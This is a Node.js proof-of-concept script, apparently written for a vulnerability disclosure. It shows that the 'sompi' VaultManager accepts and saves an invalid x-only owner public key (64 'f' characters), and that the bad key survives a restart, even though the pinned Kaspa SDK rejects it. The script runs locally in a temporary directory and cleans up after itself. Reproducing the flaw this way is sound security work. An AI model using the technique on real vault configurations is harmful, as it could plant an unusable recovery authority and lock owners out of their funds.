#!/usr/bin/env node

import fs from "node:fs";
import { createRequire } from "node:module";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";

const targetArgument = process.argv[2];
if (!targetArgument) {
  process.stderr.write("usage: node reproduce.mjs <relative-path-to-built-sompi>\n");
  process.exit(64);
}

const targetRoot = path.resolve(process.cwd(), targetArgument);
const packagePath = path.join(targetRoot, "package.json");
const vaultModulePath = path.join(targetRoot, "dist", "vault.js");
const kaspaModulePath = path.join(targetRoot, "vendor", "kaspa-wasm", "kaspa.js");

for (const required of [packagePath, vaultModulePath, kaspaModulePath]) {
  if (!fs.existsSync(required)) {
    process.stderr.write(`[-] missing target file: ${path.relative(process.cwd(), required)}\n`);
    process.stderr.write("[-] run `npm ci` and `npm run build` in the target checkout first\n");
    process.exit(66);
  }
}

const packageJson = JSON.parse(fs.readFileSync(packagePath, "utf8"));
const { VaultManager } = await import(pathToFileURL(vaultModulePath).href);
const require = createRequire(import.meta.url);
const { XOnlyPublicKey } = require(kaspaModulePath);

const candidate = "f".repeat(64);
const stateRoot = fs.mkdtempSync(path.join(os.tmpdir(), "sompi-invalid-owner-poc-"));
fs.chmodSync(stateRoot, 0o700);

try {
  let sdkAcceptsCandidate = true;
  let parsedKey;
  try {
    parsedKey = new XOnlyPublicKey(candidate);
  } catch {
    sdkAcceptsCandidate = false;
  } finally {
    parsedKey?.free();
  }

  const vault = new VaultManager(stateRoot, "testnet-10");
  let created;
  let createError;
  try {
    created = vault.create(1n, candidate, 1n);
  } catch (error) {
    createError = error;
  }

  const vaultAcceptedCandidate = created?.ownerPublic === candidate;
  let persistedOwnerMatches = false;
  let restartAcceptsPoisonedConfig = false;

  if (vaultAcceptedCandidate) {
    const saved = JSON.parse(
      fs.readFileSync(path.join(stateRoot, "vault", "config.json"), "utf8")
    );
    persistedOwnerMatches = saved.ownerPublic === candidate;
    const restarted = new VaultManager(stateRoot, "testnet-10");
    restartAcceptsPoisonedConfig =
      restarted.configured && restarted.config().ownerPublic === candidate;
  }

  process.stdout.write(`[+] package version: ${packageJson.version ?? "unknown"}\n`);
  process.stdout.write(`[+] candidate: ${candidate}\n`);
  process.stdout.write(`[+] pinned SDK accepts candidate: ${sdkAcceptsCandidate}\n`);
  process.stdout.write(`[+] VaultManager.create accepts candidate: ${vaultAcceptedCandidate}\n`);

  if (!vaultAcceptedCandidate) {
    process.stdout.write(`[-] create error: ${createError?.message ?? "unknown"}\n`);
    process.stdout.write("[-] not reproduced: target rejected the invalid x-only point\n");
    process.exitCode = 2;
  } else {
    process.stdout.write(`[+] persisted ownerPublic matches candidate: ${persistedOwnerMatches}\n`);
    process.stdout.write(`[+] restart accepts poisoned configuration: ${restartAcceptsPoisonedConfig}\n`);

    if (sdkAcceptsCandidate || !persistedOwnerMatches || !restartAcceptsPoisonedConfig) {
      throw new Error("target behavior did not match the expected vulnerable invariant");
    }

    process.stdout.write(
      "[+] vulnerability reproduced: invalid x-only recovery authority persisted\n"
    );
  }
} catch (error) {
  process.stderr.write(`[-] PoC failed: ${error instanceof Error ? error.stack : String(error)}\n`);
  process.exitCode = 1;
} finally {
  fs.rmSync(stateRoot, { recursive: true, force: true });
  process.stdout.write("[+] cleanup: temporary vault state removed\n");
}
